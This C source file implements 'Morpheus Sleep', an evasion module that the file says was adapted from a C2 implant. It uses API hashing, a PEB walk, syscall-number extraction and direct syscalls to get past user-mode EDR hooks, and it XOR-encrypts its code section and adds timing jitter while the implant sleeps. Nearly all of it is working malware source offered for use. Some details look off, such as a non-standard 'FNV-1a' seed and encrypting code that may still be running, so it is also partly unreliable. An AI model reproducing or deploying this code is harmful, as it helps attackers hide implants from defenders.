/*
 * BM-T6001: Morpheus Sleep — Implementation
 *
 * Mixed-technique sleep obfuscation with optional page fluctuation.
 * Extracted and adapted from gc2 implant sleep patterns.
 *
 * Resolution strategy (integrates BM-T1001 + BM-T1003):
 *   1. PEB walk to find ntdll by FNV-1a hash      (BM-T1001)
 *   2. EAT parsing to resolve functions by hash    (BM-T1001)
 *   3. SSN extraction from NT function stubs       (BM-T1003)
 *   4. Direct syscall invocation for ALL Nt* funcs (BM-T1003)
 *
 * OPSEC:
 *   - Zero strings in binary (all hash-based)
 *   - Zero kernel32/advapi32 imports
 *   - Zero GetProcAddress / GetModuleHandle / LdrGetProcedureAddress
 *   - All Nt* functions invoked via direct syscall (bypasses user-mode hooks)
 *   - Rtl* functions resolved by hash, called through function pointers
 */

#include "morpheus.h"
#include <winternl.h>

/* ══════════════════════════════════════════════════════════════════════
 * Pre-computed FNV-1a hashes (case-insensitive) — NO STRINGS IN BINARY
 * Generated with: python3 gen_hashes.py  (included in this directory)
 * Algorithm matches BM-T1001 loader.c — hash_name().
 * ══════════════════════════════════════════════════════════════════════ */

#define H_NTDLL_DLL                  0x1617909Fu
/* NtDelayExecution deliberately excluded — most profiled sleep primitive */
#define H_NTCREATETIMER              0x21890DD8u
#define H_NTSETTIMER                 0x1282968Eu
#define H_NTWAITFORSINGLEOBJECT      0x44DBF482u
#define H_NTCLOSE                    0xC6CF98E9u
#define H_NTCREATEEVENT              0x243E5511u
#define H_NTPROTECTVIRTUALMEMORY     0xB52CA56Au
#define H_NTYIELDEXECUTION           0x180458E6u
#define H_NTQUERYPERFORMANCECOUNTER  0x949FB727u
#define H_RTLALLOCATEHEAP            0xF8765144u
#define H_RTLFREEHEAP                0x2C30F5D1u

/* ══════════════════════════════════════════════════════════════════════
 * BM-T1001 Integration: FNV-1a Hash + PEB Walk + EAT Resolution
 * ══════════════════════════════════════════════════════════════════════ */

/* FNV-1a 32-bit hash (ASCII, case-insensitive) — from BM-T1001 */
static DWORD hash_name(const char *str)
{
    DWORD h = 0x9E3779B9u;
    for (; *str; str++) {
        unsigned char c = (unsigned char)*str;
        if (c >= 'A' && c <= 'Z') c = (unsigned char)(c - 'A' + 'a');
        h ^= c;
        h *= 0x01000193u;
    }
    return h;
}

/* FNV-1a 32-bit hash (wide/Unicode, case-insensitive) — from BM-T1001 */
static DWORD hash_name_wide(const wchar_t *str)
{
    DWORD h = 0x9E3779B9u;
    for (; *str; str++) {
        wchar_t ch = *str;
        if (ch >= L'A' && ch <= L'Z') ch = (wchar_t)(ch - L'A' + L'a');
        unsigned char c = (unsigned char)(ch & 0xFF);
        h ^= c;
        h *= 0x01000193u;
    }
    return h;
}

/* LDR_DATA_TABLE_ENTRY for PEB walk (undocumented struct) */
typedef struct _LDR_DATA_TABLE_ENTRY_CUSTOM {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY_CUSTOM;

/*
 * Get PEB via TEB indirection (less suspicious than direct GS:[0x60]).
 * GS:[0x30] is the TEB self-pointer — accessed constantly by normal code
 * (exception handling, TLS, etc.) so it blends in. TEB+0x60 gives PEB.
 */
static BYTE *get_peb(void)
{
    BYTE *teb = (BYTE *)__readgsqword(0x30);   /* TEB self-reference   */
    return *(BYTE **)(teb + 0x60);              /* TEB->PEB             */
}

/* PEB walk: locate a loaded module by FNV-1a hash — from BM-T1001 */
static HMODULE locate_base(DWORD target_hash)
{
    BYTE *peb = get_peb();
    if (!peb) return NULL;

    /* PEB->Ldr at offset 0x18 */
    PEB_LDR_DATA *ldr = *(PEB_LDR_DATA **)(peb + 0x18);
    if (!ldr) return NULL;

    LIST_ENTRY *head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY *current = head->Flink;

    while (current != head) {
        LDR_DATA_TABLE_ENTRY_CUSTOM *entry = CONTAINING_RECORD(
            current, LDR_DATA_TABLE_ENTRY_CUSTOM, InMemoryOrderLinks);

        if (entry->BaseDllName.Buffer) {
            DWORD module_hash = hash_name_wide(entry->BaseDllName.Buffer);
            if (module_hash == target_hash)
                return (HMODULE)entry->DllBase;
        }
        current = current->Flink;
    }
    return NULL;
}

/* EAT resolution: resolve an export by FNV-1a hash — from BM-T1001 */
static FARPROC resolve_addr(HMODULE module, DWORD target_hash)
{
    if (!module) return NULL;

    BYTE *base = (BYTE *)module;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    IMAGE_DATA_DIRECTORY *dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (dir->VirtualAddress == 0) return NULL;

    IMAGE_EXPORT_DIRECTORY *exports = (IMAGE_EXPORT_DIRECTORY *)(base + dir->VirtualAddress);
    DWORD *name_rvas = (DWORD *)(base + exports->AddressOfNames);
    WORD  *ordinals  = (WORD  *)(base + exports->AddressOfNameOrdinals);
    DWORD *func_rvas = (DWORD *)(base + exports->AddressOfFunctions);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        char *name = (char *)(base + name_rvas[i]);
        if (hash_name(name) == target_hash) {
            DWORD func_rva = func_rvas[ordinals[i]];
            /* Skip forwarded exports */
            if (func_rva >= dir->VirtualAddress &&
                func_rva < dir->VirtualAddress + dir->Size)
                return NULL;
            return (FARPROC)(base + func_rva);
        }
    }
    return NULL;
}

/* ══════════════════════════════════════════════════════════════════════
 * BM-T1003 Integration: SSN Extraction
 * ══════════════════════════════════════════════════════════════════════ */

/*
 * Extract syscall service number from an NT function stub.
 * Follows trampolines (JMP hooks) up to 5 hops, then scans for
 * the pattern: 4C 8B D1 B8 [SSN] (mov r10,rcx; mov eax,ssn)
 * — from BM-T1003
 */
static DWORD extract_ssn(void *func_addr)
{
    unsigned char *p = (unsigned char *)func_addr;
    if (!p) return 0;

    /* Follow trampolines (up to 5 hops) */
    for (int i = 0; i < 5; i++) {
        if (p[0] == 0xE9) {                         /* JMP rel32 */
            int rel = *(int *)(p + 1);
            p = p + 5 + rel;
            continue;
        }
        if (p[0] == 0xEB) {                         /* JMP rel8 */
            signed char rel = *(signed char *)(p + 1);
            p = p + 2 + rel;
            continue;
        }
        if (p[0] == 0xFF && p[1] == 0x25) {         /* JMP [rip+rel32] */
            int rel = *(int *)(p + 2);
            void **target = (void **)(p + 6 + rel);
            p = (unsigned char *)*target;
            continue;
        }
        break;
    }

    /* Scan for syscall stub: 4C 8B D1 B8 [SSN] */
    for (int off = 0; off < 128; off++) {
        if (p[off] == 0x4C && p[off+1] == 0x8B &&
            p[off+2] == 0xD1 && p[off+3] == 0xB8) {
            return *(DWORD *)(p + off + 4);
        }
    }

    /* Fallback: B8 [SSN] 0F 05 C3 (mov eax,ssn; syscall; ret) */
    for (int off = 0; off < 128; off++) {
        if (p[off] == 0xB8 &&
            p[off+5] == 0x0F && p[off+6] == 0x05 && p[off+7] == 0xC3) {
            return *(DWORD *)(p + off + 1);
        }
    }

    return 0;
}

/* ══════════════════════════════════════════════════════════════════════
 * External declarations: Assembly syscall stubs + SSN globals
 * (defined in morpheus_syscalls.s)
 * ══════════════════════════════════════════════════════════════════════ */

/* SSN globals — defined here (not in .s) so stores are RIP-relative, not .refptr. */
DWORD g_ssn_create_timer __attribute__((visibility("hidden")));
DWORD g_ssn_set_timer __attribute__((visibility("hidden")));
DWORD g_ssn_wait __attribute__((visibility("hidden")));
DWORD g_ssn_close __attribute__((visibility("hidden")));
DWORD g_ssn_create_event __attribute__((visibility("hidden")));
DWORD g_ssn_protect __attribute__((visibility("hidden")));
DWORD g_ssn_yield __attribute__((visibility("hidden")));
DWORD g_ssn_query_perf __attribute__((visibility("hidden")));

/* Assembly syscall stubs — each does: mov r10,rcx; mov eax,[ssn]; syscall; ret */
extern NTSTATUS morpheus_sc_create_timer(PHANDLE, ACCESS_MASK, PVOID, DWORD);
extern NTSTATUS morpheus_sc_set_timer(HANDLE, PLARGE_INTEGER, PVOID, PVOID, BOOLEAN, LONG, PBOOLEAN);
extern NTSTATUS morpheus_sc_wait(HANDLE, BOOLEAN, PLARGE_INTEGER);
extern NTSTATUS morpheus_sc_close(HANDLE);
extern NTSTATUS morpheus_sc_create_event(PHANDLE, ACCESS_MASK, PVOID, DWORD, BOOLEAN);
extern NTSTATUS morpheus_sc_protect(HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
extern NTSTATUS morpheus_sc_yield(void);
extern NTSTATUS morpheus_sc_query_perf(PLARGE_INTEGER, PLARGE_INTEGER);

/* ══════════════════════════════════════════════════════════════════════
 * Rtl* function pointer types (NOT syscalls — called via resolved ptr)
 * ══════════════════════════════════════════════════════════════════════ */

typedef PVOID   (NTAPI *fn_RtlAllocateHeap)(PVOID, ULONG, SIZE_T);
typedef BOOLEAN (NTAPI *fn_RtlFreeHeap)(PVOID, ULONG, PVOID);

/* ══════════════════════════════════════════════════════════════════════
 * Context structure (opaque to caller)
 * ══════════════════════════════════════════════════════════════════════ */

struct morpheus_ctx {
    /* Config snapshot */
    morpheus_config_t config;

    /* PEB-derived pointers */
    PVOID process_heap;       /* PEB->ProcessHeap        */
    PVOID image_base;         /* PEB->ImageBaseAddress    */

    /* Rtl* function pointers (not syscalls) */
    fn_RtlAllocateHeap RtlAllocateHeap;
    fn_RtlFreeHeap     RtlFreeHeap;

    /* Page guard state */
    void  *guard_base;
    SIZE_T guard_size;
    DWORD  guard_original_prot;

    /* Simple RNG state (xorshift32) */
    DWORD rng_state;

    /* Round-robin counter (used when technique_selection == ROUND_ROBIN) */
    DWORD next_technique;
};

/* ══════════════════════════════════════════════════════════════════════
 * PRNG — avoids CRT rand / RtlGenRandom
 * ══════════════════════════════════════════════════════════════════════ */

static DWORD xorshift32(DWORD *state)
{
    DWORD x = *state;
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    *state = x;
    return x;
}

static DWORD rng_range(DWORD *state, DWORD lo, DWORD hi)
{
    if (lo >= hi) return lo;
    return lo + (xorshift32(state) % (hi - lo + 1));
}

/* Seed from RDTSC (no API call) */
static DWORD seed_rng(void)
{
    unsigned int lo, hi;
#if defined(__GNUC__) || defined(__clang__)
    __asm__ volatile ("rdtsc" : "=a"(lo), "=d"(hi));
#elif defined(_MSC_VER)
    unsigned long long tsc = __rdtsc();
    lo = (unsigned int)tsc;
    hi = (unsigned int)(tsc >> 32);
#else
    lo = 0xDEADBEEF; hi = 0xCAFE;
#endif
    DWORD s = lo ^ hi ^ (lo >> 7);
    if (s == 0) s = 0xDEADBEEF;
    return s;
}

/* ══════════════════════════════════════════════════════════════════════
 * Bootstrap: PEB walk → hash resolution → SSN extraction
 * ══════════════════════════════════════════════════════════════════════ */

typedef struct {
    HMODULE ntdll;
    fn_RtlAllocateHeap RtlAllocateHeap;
    fn_RtlFreeHeap     RtlFreeHeap;
    PVOID process_heap;
    PVOID image_base;
} bootstrap_t;

static int bootstrap(bootstrap_t *bs)
{
    /* Step 1: Find ntdll via PEB walk + FNV-1a hash (BM-T1001) */
    bs->ntdll = locate_base(H_NTDLL_DLL);
    if (!bs->ntdll) return MORPHEUS_ERR_RESOLVE;

    /* Step 2: Resolve Nt* function addresses via hash and extract SSNs.
     * Assign at runtime (LEA) — a static table of &g_ssn_* is an absolute VA blob. */
#define BIND_SSN(hash, dst) do { \
        FARPROC _addr = resolve_addr(bs->ntdll, (hash)); \
        DWORD _ssn; \
        if (!_addr) return MORPHEUS_ERR_RESOLVE; \
        _ssn = extract_ssn((void *)_addr); \
        if (_ssn == 0) return MORPHEUS_ERR_RESOLVE; \
        (dst) = _ssn; \
    } while (0)
    BIND_SSN(H_NTCREATETIMER,             g_ssn_create_timer);
    BIND_SSN(H_NTSETTIMER,                g_ssn_set_timer);
    BIND_SSN(H_NTWAITFORSINGLEOBJECT,     g_ssn_wait);
    BIND_SSN(H_NTCLOSE,                   g_ssn_close);
    BIND_SSN(H_NTCREATEEVENT,             g_ssn_create_event);
    BIND_SSN(H_NTPROTECTVIRTUALMEMORY,    g_ssn_protect);
    BIND_SSN(H_NTYIELDEXECUTION,          g_ssn_yield);
    BIND_SSN(H_NTQUERYPERFORMANCECOUNTER, g_ssn_query_perf);
#undef BIND_SSN

    /* Step 3: Resolve Rtl* functions (not syscalls — function pointers) */
    bs->RtlAllocateHeap = (fn_RtlAllocateHeap)(void *)resolve_addr(bs->ntdll, H_RTLALLOCATEHEAP);
    bs->RtlFreeHeap     = (fn_RtlFreeHeap)    (void *)resolve_addr(bs->ntdll, H_RTLFREEHEAP);
    if (!bs->RtlAllocateHeap || !bs->RtlFreeHeap)
        return MORPHEUS_ERR_RESOLVE;

    /* Step 4: Get ProcessHeap and ImageBaseAddress from PEB
     * Uses TEB→PEB indirection (via get_peb) instead of direct GS:[0x60].
     * PEB offsets (x64):  +0x10 ImageBaseAddress,  +0x30 ProcessHeap
     */
    BYTE *peb = get_peb();
    bs->image_base   = *(PVOID *)(peb + 0x10);
    bs->process_heap = *(PVOID *)(peb + 0x30);

    return MORPHEUS_OK;
}

/* ══════════════════════════════════════════════════════════════════════
 * Auto-discover code section from PEB image base
 * ══════════════════════════════════════════════════════════════════════ */

static void discover_code_section(morpheus_ctx_t *ctx)
{
    if (ctx->guard_base && ctx->guard_size)
        return; /* Caller supplied explicit region */

    PVOID base = ctx->image_base;
    if (!base) return;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE *)base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return;

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (sec->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            ctx->guard_base = (BYTE *)base + sec->VirtualAddress;
            ctx->guard_size = sec->Misc.VirtualSize;
            break;
        }
    }
}

/* ══════════════════════════════════════════════════════════════════════
 * Page guard: encrypt/decrypt code section via direct syscall
 * Uses NtProtectVirtualMemory (direct syscall, bypasses hooks)
 * ══════════════════════════════════════════════════════════════════════ */

static int page_guard_encrypt(morpheus_ctx_t *ctx)
{
    if (!ctx->config.enable_page_guard || !ctx->guard_base || !ctx->guard_size)
        return MORPHEUS_OK;

    PVOID addr = ctx->guard_base;
    SIZE_T size = ctx->guard_size;
    ULONG old_prot = 0;

    /* Direct syscall — bypasses any user-mode hook on NtProtectVirtualMemory */
    NTSTATUS st = morpheus_sc_protect(
        (HANDLE)-1, &addr, &size, PAGE_READWRITE, &old_prot);
    if (st < 0) return MORPHEUS_ERR_PROTECT;

    ctx->guard_original_prot = old_prot;

    /* XOR encrypt the code section */
    BYTE key = ctx->config.xor_key;
    BYTE *p = (BYTE *)ctx->guard_base;
    for (SIZE_T i = 0; i < ctx->guard_size; i++)
        p[i] ^= key;

    return MORPHEUS_OK;
}

static int page_guard_decrypt(morpheus_ctx_t *ctx)
{
    if (!ctx->config.enable_page_guard || !ctx->guard_base || !ctx->guard_size)
        return MORPHEUS_OK;

    /* XOR decrypt (same operation as encrypt) */
    BYTE key = ctx->config.xor_key;
    BYTE *p = (BYTE *)ctx->guard_base;
    for (SIZE_T i = 0; i < ctx->guard_size; i++)
        p[i] ^= key;

    /* Restore original protection via direct syscall */
    PVOID addr = ctx->guard_base;
    SIZE_T size = ctx->guard_size;
    ULONG tmp = 0;

    NTSTATUS st = morpheus_sc_protect(
        (HANDLE)-1, &addr, &size, ctx->guard_original_prot, &tmp);
    if (st < 0) return MORPHEUS_ERR_PROTECT;

    return MORPHEUS_OK;
}

/* ══════════════════════════════════════════════════════════════════════
 * Sleep techniques — ALL use direct syscalls
 * ══════════════════════════════════════════════════════════════════════ */

/* Technique 0: NtCreateTimer + NtSetTimer + NtWaitForSingleObject (direct syscalls) */
static int sleep_timer(morpheus_ctx_t *ctx, DWORD ms)
{
    (void)ctx;
    HANDLE hTimer = NULL;
    NTSTATUS st;

    /* SynchronizationTimer = 1 */
    st = morpheus_sc_create_timer(&hTimer, TIMER_ALL_ACCESS, NULL, 1);
    if (st < 0) return MORPHEUS_ERR_TIMER;

    LARGE_INTEGER due;
    due.QuadPart = -((LONGLONG)ms * 10000);

    BOOLEAN prev = FALSE;
    st = morpheus_sc_set_timer(hTimer, &due, NULL, NULL, FALSE, 0, &prev);
    if (st < 0) {
        morpheus_sc_close(hTimer);
        return MORPHEUS_ERR_SLEEP;
    }

    morpheus_sc_wait(hTimer, FALSE, NULL);
    morpheus_sc_close(hTimer);

    return MORPHEUS_OK;
}

/* Technique 1: NtCreateEvent + NtWaitForSingleObject (direct syscalls) */
static int sleep_event(morpheus_ctx_t *ctx, DWORD ms)
{
    (void)ctx;
    HANDLE hEvent = NULL;
    NTSTATUS st;

    /* NotificationEvent = 0 — event never signaled, wait times out */
    st = morpheus_sc_create_event(&hEvent, EVENT_ALL_ACCESS, NULL, 0, FALSE);
    if (st < 0) return MORPHEUS_ERR_SLEEP;

    LARGE_INTEGER timeout;
    timeout.QuadPart = -((LONGLONG)ms * 10000);

    morpheus_sc_wait(hEvent, FALSE, &timeout);
    morpheus_sc_close(hEvent);

    return MORPHEUS_OK;
}

/* Technique 2: Encrypted busy-wait (direct syscalls for timing + yield) */
static int sleep_busywait(morpheus_ctx_t *ctx, DWORD ms)
{
    BYTE buf[256];
    BYTE key = ctx->config.xor_key;
    for (int i = 0; i < 256; i++) buf[i] = (BYTE)(i ^ 0x55);

    LARGE_INTEGER freq, start, now;
    /* NtQueryPerformanceCounter via direct syscall */
    morpheus_sc_query_perf(&start, &freq);

    LONGLONG target = (LONGLONG)ms * freq.QuadPart / 1000;

    do {
        for (int i = 0; i < 256; i++) buf[i] ^= key;

        /* NtYieldExecution via direct syscall */
        morpheus_sc_yield();

        morpheus_sc_query_perf(&now, NULL);
    } while ((now.QuadPart - start.QuadPart) < target);

    return MORPHEUS_OK;
}

/* ── Sleep primitives (no function-pointer table — those bake absolute VAs). */

/* ══════════════════════════════════════════════════════════════════════
 * Public API
 * ══════════════════════════════════════════════════════════════════════ */

int morpheus_init(const morpheus_config_t *config, morpheus_ctx_t **out_ctx)
{
    /* Bootstrap: PEB walk → hash resolution → SSN extraction */
    bootstrap_t bs = {0};
    int rc = bootstrap(&bs);
    if (rc != MORPHEUS_OK) return rc;

    /* Allocate context via RtlAllocateHeap (hash-resolved, no kernel32) */
    morpheus_ctx_t *ctx = (morpheus_ctx_t *)bs.RtlAllocateHeap(
        bs.process_heap, 0x00000008 /* HEAP_ZERO_MEMORY */, sizeof(morpheus_ctx_t));
    if (!ctx) return MORPHEUS_ERR_RESOLVE;

    /* Store heap functions and PEB pointers */
    ctx->RtlAllocateHeap = bs.RtlAllocateHeap;
    ctx->RtlFreeHeap     = bs.RtlFreeHeap;
    ctx->process_heap    = bs.process_heap;
    ctx->image_base      = bs.image_base;

    if (config)
        ctx->config = *config;
    else {
        morpheus_config_t def = MORPHEUS_CONFIG_DEFAULT;
        ctx->config = def;
    }

    /* Seed RNG from RDTSC */
    ctx->rng_state = seed_rng();

    /* Copy caller-supplied guard region or auto-discover */
    ctx->guard_base = ctx->config.guard_base;
    ctx->guard_size = ctx->config.guard_size;

    if (ctx->config.enable_page_guard)
        discover_code_section(ctx);

    *out_ctx = ctx;
    return MORPHEUS_OK;
}

int morpheus_sleep(morpheus_ctx_t *ctx, DWORD ms)
{
    if (!ctx) return MORPHEUS_ERR_RESOLVE;

    /* Apply jitter: ±jitter_percent */
    if (ctx->config.jitter_percent > 0) {
        DWORD pct = ctx->config.jitter_percent;
        DWORD range = (ms * pct) / 100;
        DWORD jitter = rng_range(&ctx->rng_state, 0, range * 2);
        ms = ms - range + jitter;
        if (ms == 0) ms = 1;
    }

    /* Split into random chunks (2000–5000 ms each) */
    DWORD remaining = ms;

    while (remaining > 0) {
        DWORD chunk;
        if (remaining > 5000)
            chunk = rng_range(&ctx->rng_state, 2000, 5000);
        else
            chunk = remaining;

        /* Pick technique based on selection mode */
        DWORD tech;
        if (ctx->config.technique_selection == MORPHEUS_SELECT_ROUND_ROBIN) {
            tech = ctx->next_technique;
            ctx->next_technique = (ctx->next_technique + 1) % MORPHEUS_TECHNIQUE_COUNT;
        } else if (ctx->config.technique_selection == MORPHEUS_SELECT_WEIGHTED) {
            /*
             * Weighted random (gc2 style):
             *   Event:    50% — looks like normal I/O/sync wait
             *   Timer:    35% — common in multimedia/threadpool apps
             *   BusyWait: 15% — no API, but burns CPU (use sparingly)
             *
             * Roll 0–99, map to technique.
             */
            DWORD roll = rng_range(&ctx->rng_state, 0, 99);
            if (roll < 50)
                tech = MORPHEUS_TECHNIQUE_EVENT;
            else if (roll < 85)
                tech = MORPHEUS_TECHNIQUE_TIMER;
            else
                tech = MORPHEUS_TECHNIQUE_BUSYWAIT;
        } else {
            tech = rng_range(&ctx->rng_state, 0, MORPHEUS_TECHNIQUE_COUNT - 1);
        }

        /* Fire optional diagnostic callback before sleeping */
        if (ctx->config.chunk_cb)
            ctx->config.chunk_cb(tech, chunk);

        /* Encrypt code section before sleeping */
        page_guard_encrypt(ctx);

        /* Execute the sleep chunk via direct syscall */
        if (tech == MORPHEUS_TECHNIQUE_TIMER)
            sleep_timer(ctx, chunk);
        else if (tech == MORPHEUS_TECHNIQUE_EVENT)
            sleep_event(ctx, chunk);
        else
            sleep_busywait(ctx, chunk);

        /* Decrypt code section after waking */
        page_guard_decrypt(ctx);

        remaining -= chunk;
    }

    return MORPHEUS_OK;
}

const char *morpheus_technique_name(DWORD technique)
{
    switch (technique) {
    case MORPHEUS_TECHNIQUE_TIMER:    return "timer (NtCreateTimer+NtSetTimer+Wait)";
    case MORPHEUS_TECHNIQUE_EVENT:    return "event (NtCreateEvent+Wait timeout)";
    case MORPHEUS_TECHNIQUE_BUSYWAIT: return "busywait (XOR loop + NtYield)";
    default:                          return "unknown";
    }
}

void morpheus_cleanup(morpheus_ctx_t *ctx)
{
    if (!ctx) return;

    /* Ensure code section is restored */
    if (ctx->config.enable_page_guard && ctx->guard_base && ctx->guard_size) {
        PVOID addr = ctx->guard_base;
        SIZE_T size = ctx->guard_size;
        ULONG tmp = 0;
        morpheus_sc_protect((HANDLE)-1, &addr, &size, PAGE_EXECUTE_READ, &tmp);
    }

    ctx->RtlFreeHeap(ctx->process_heap, 0, ctx);
}
